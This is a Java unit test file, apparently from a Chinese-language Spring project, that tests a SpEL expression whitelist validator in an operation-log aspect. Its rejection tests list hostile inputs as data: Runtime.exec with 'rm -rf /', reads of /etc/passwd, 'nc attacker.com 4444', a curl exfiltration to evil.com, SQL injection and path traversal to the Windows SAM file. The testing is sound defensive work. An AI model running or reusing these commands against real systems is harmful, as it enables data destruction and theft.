package com.order.platform.common.aspect;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.test.util.ReflectionTestUtils;

import static org.assertj.core.api.Assertions.*;

/**
 * OperationLogAspect 单元测试
 *
 * 测试范围：SpEL 表达式白名单验证
 *
 * @author 开发组
 * @since 1.0.0
 */
@ExtendWith(MockitoExtension.class)
@DisplayName("操作日志切面测试")
class OperationLogAspectTest {

    @InjectMocks
    private OperationLogAspect operationLogAspect;

    // ==================== SpEL 表达式验证测试 ====================

    @Nested
    @DisplayName("SpEL 表达式白名单验证测试")
    class ValidateExpressionTests {

        // ==================== 正常场景 ====================

        @Test
        @DisplayName("✅ 应该通过简单的变量引用")
        void shouldPass_simpleVariableReference() {
            // Arrange
            String expression = "#user";

            // Act & Assert
            assertThatCode(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    expression
                );
            }).doesNotThrowAnyException();
        }

        @Test
        @DisplayName("✅ 应该通过嵌套属性访问")
        void shouldPass_nestedPropertyAccess() {
            // Arrange
            String expression = "#user.username";

            // Act & Assert
            assertThatCode(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    expression
                );
            }).doesNotThrowAnyException();
        }

        @Test
        @DisplayName("✅ 应该通过深层嵌套属性访问")
        void shouldPass_deepNestedPropertyAccess() {
            // Arrange
            String expression = "#order.customer.user.username";

            // Act & Assert
            assertThatCode(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    expression
                );
            }).doesNotThrowAnyException();
        }

        @Test
        @DisplayName("✅ 应该通过数组索引访问")
        void shouldPass_arrayIndexAccess() {
            // Arrange
            String expression = "#orderItems[0]";

            // Act & Assert
            assertThatCode(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    expression
                );
            }).doesNotThrowAnyException();
        }

        @Test
        @DisplayName("✅ 应该通过属性和索引组合")
        void shouldPass_propertyWithIndexAccess() {
            // Arrange
            String expression = "#order.items[0].productName";

            // Act & Assert
            assertThatCode(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    expression
                );
            }).doesNotThrowAnyException();
        }

        @Test
        @DisplayName("✅ 应该通过下划线命名变量")
        void shouldPass_underscoreNamedVariable() {
            // Arrange
            String expression = "#order_detail.order_no";

            // Act & Assert
            assertThatCode(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    expression
                );
            }).doesNotThrowAnyException();
        }

        // ==================== 边界值测试 ====================

        @Test
        @DisplayName("⚠️ 应该拒绝空表达式")
        void shouldReject_emptyExpression() {
            // Arrange
            String expression = "";

            // Act & Assert
            assertThatThrownBy(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    expression
                );
            })
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("表达式格式不符合安全规范");
        }

        @Test
        @DisplayName("⚠️ 应该拒绝超过最大长度的表达式")
        void shouldReject_expressionExceedingMaxLength() {
            // Arrange
            String expression = "#a".repeat(201); // 超过 200 字符

            // Act & Assert
            assertThatThrownBy(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    expression
                );
            })
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("表达式长度超过限制");
        }

        @Test
        @DisplayName("✅ 应该通过恰好等于最大长度的表达式")
        void shouldPass_expressionExactlyMaxLength() {
            // Arrange
            // 创建恰好 200 字符的表达式: "#" + 199个"a"
            String expression = "#" + "a".repeat(199); // 恰好 200 字符

            // Act & Assert
            assertThatCode(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    expression
                );
            }).doesNotThrowAnyException();
        }

        @Test
        @DisplayName("✅ 应该自动去除前后空格")
        void shouldTrim_leadingAndTrailingSpaces() {
            // Arrange
            String expression = "  #user.username  ";

            // Act & Assert
            assertThatCode(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    expression
                );
            }).doesNotThrowAnyException();
        }

        // ==================== 恶意输入测试 ====================

        @Test
        @DisplayName("🚫 应该拒绝类引用（T() 函数）")
        void shouldReject_classReference() {
            // Arrange
            String maliciousExpression = "T(java.lang.Runtime)";

            // Act & Assert
            assertThatThrownBy(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    maliciousExpression
                );
            })
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("禁止的危险表达式模式");
        }                                                                         

        @Test
        @DisplayName("🚫 应该拒绝 Runtime.exec() 调用")
        void shouldReject_runtimeExecCall() {
            // Arrange
            String maliciousExpression = "#user.getRuntime().exec('rm -rf /')";

            // Act & Assert
            assertThatThrownBy(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    maliciousExpression
                );
            })
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("禁止的危险表达式模式");
        }

        @Test
        @DisplayName("🚫 应该拒绝 ProcessBuilder 调用")
        void shouldReject_processBuilderCall() {
            // Arrange
            String maliciousExpression = "#user.new ProcessBuilder()";

            // Act & Assert
            assertThatThrownBy(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    maliciousExpression
                );
            })
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("禁止的危险表达式模式");
        }

        @Test
        @DisplayName("🚫 应该拒绝 System.getProperty() 调用")
        void shouldReject_systemPropertyAccess() {
            // Arrange
            String maliciousExpression = "#user.system.getProperty('user.home')";

            // Act & Assert
            assertThatThrownBy(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    maliciousExpression
                );
            })
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("禁止的危险表达式模式");
        }

        @Test
        @DisplayName("🚫 应该拒绝方法调用（使用括号）")
        void shouldReject_methodCall() {
            // Arrange
            String maliciousExpression = "#user.toString()";

            // Act & Assert
            assertThatThrownBy(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    maliciousExpression
                );
            })
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("表达式格式不符合安全规范");
        }

        @Test
        @DisplayName("🚫 应该拒绝字符串拼接操作")
        void shouldReject_stringConcatenation() {
            // Arrange
            String maliciousExpression = "#user.name + 'admin'";

            // Act & Assert
            assertThatThrownBy(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    maliciousExpression
                );
            })
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("表达式格式不符合安全规范");
        }

        @Test
        @DisplayName("🚫 应该拒绝算术运算")
        void shouldReject_arithmeticOperations() {
            // Arrange
            String maliciousExpression = "#user.age + 1";

            // Act & Assert
            assertThatThrownBy(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    maliciousExpression
                );
            })
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("表达式格式不符合安全规范");
        }

        @Test
        @DisplayName("🚫 应该拒绝逻辑运算")
        void shouldReject_logicalOperations() {
            // Arrange
            String maliciousExpression = "#user.isAdmin and #user.isActive";

            // Act & Assert
            assertThatThrownBy(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    maliciousExpression
                );
            })
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("表达式格式不符合安全规范");
        }

        @Test
        @DisplayName("🚫 应该拒绝特殊字符注入")
        void shouldReject_specialCharacters() {
            // Arrange
            String[] maliciousExpressions = {
                "#user.name'; DROP TABLE users; --",
                "#user.name OR 1=1",
                "#user.name\u0000.null",
                "#user.name\\n.eval("
            };

            for (String expression : maliciousExpressions) {
                assertThatThrownBy(() -> {
                    ReflectionTestUtils.invokeMethod(
                        operationLogAspect,
                        "validateExpression",
                        expression
                    );
                })
                    .isInstanceOf(SecurityException.class)
                    .as("应该拒绝表达式: " + expression);
            }
        }

        // ==================== Unicode 和编码测试 ====================

        @Test
        @DisplayName("🚫 应该拒绝 Unicode 换行符")
        void shouldReject_unicodeNewline() {
            // Arrange
            String maliciousExpression = "#user.name\u2028.eval(";

            // Act & Assert
            assertThatThrownBy(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    maliciousExpression
                );
            }).isInstanceOf(SecurityException.class);
        }

        @Test
        @DisplayName("✅ 应该支持中文属性名")
        void shouldPass_chinesePropertyName() {
            // Arrange
            String expression = "#user.用户名";

            // Act & Assert
            assertThatCode(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    expression
                );
            }).doesNotThrowAnyException();
        }

        // ==================== 真实攻击场景测试 ====================

        @Test
        @DisplayName("🛡️ 应该防御命令注入攻击")
        void shouldDefend_commandInjectionAttack() {
            // Arrange - 常见的命令注入模式
            String[] attacks = {
                "#user.name'; rm -rf /; echo '",
                "#user.name && cat /etc/passwd",
                "#user.name | nc attacker.com 4444",
                "#user.name; curl http://evil.com/steal?data="
            };

            for (String attack : attacks) {
                assertThatThrownBy(() -> {
                    ReflectionTestUtils.invokeMethod(
                        operationLogAspect,
                        "validateExpression",
                        attack
                    );
                })
                    .isInstanceOf(SecurityException.class)
                    .as("应该防御命令注入: " + attack);
            }
        }

        @Test
        @DisplayName("🛡️ 应该防御路径遍历攻击")
        void shouldDefend_pathTraversalAttack() {
            // Arrange - 路径遍历攻击模式
            String[] attacks = {
                "#user.path../../../etc/passwd",
                "#user.path..\\..\\..\\windows\\system32\\config\\sam"
            };

            for (String attack : attacks) {
                assertThatThrownBy(() -> {
                    ReflectionTestUtils.invokeMethod(
                        operationLogAspect,
                        "validateExpression",
                        attack
                    );
                })
                    .isInstanceOf(SecurityException.class)
                    .as("应该防御路径遍历: " + attack);
            }
        }

        @Test
        @DisplayName("🛡️ 应该防御日志注入攻击")
        void shouldDefend_logInjectionAttack() {
            // Arrange - 日志注入攻击模式
            String[] attacks = {
                "#user.name\n[INFO] Admin logged in",
                "#user.name\r\n[ERROR] Fake error message",
                "#user.name\u2028[WARN] Suspicious activity"
            };

            for (String attack : attacks) {
                // 日志注入可能通过正则验证，但会被其他安全机制拦截
                // 这里主要测试格式验证
                assertThatThrownBy(() -> {
                    ReflectionTestUtils.invokeMethod(
                        operationLogAspect,
                        "validateExpression",
                        attack
                    );
                }).isInstanceOf(SecurityException.class);
            }
        }

        // ==================== 性能测试 ====================

        @Test
        @DisplayName("⚡ 应该在合理时间内完成验证（性能测试）")
        void shouldComplete_validationInReasonableTime() {
            // Arrange
            String expression = "#order.customer.user.username";

            // Act & Assert
            long startTime = System.currentTimeMillis();

            assertThatCode(() -> {
                ReflectionTestUtils.invokeMethod(
                    operationLogAspect,
                    "validateExpression",
                    expression
                );
            }).doesNotThrowAnyException();

            long duration = System.currentTimeMillis() - startTime;

            assertThat(duration)
                .as("验证应该在 10ms 内完成")
                .isLessThan(10);
        }
    }
}
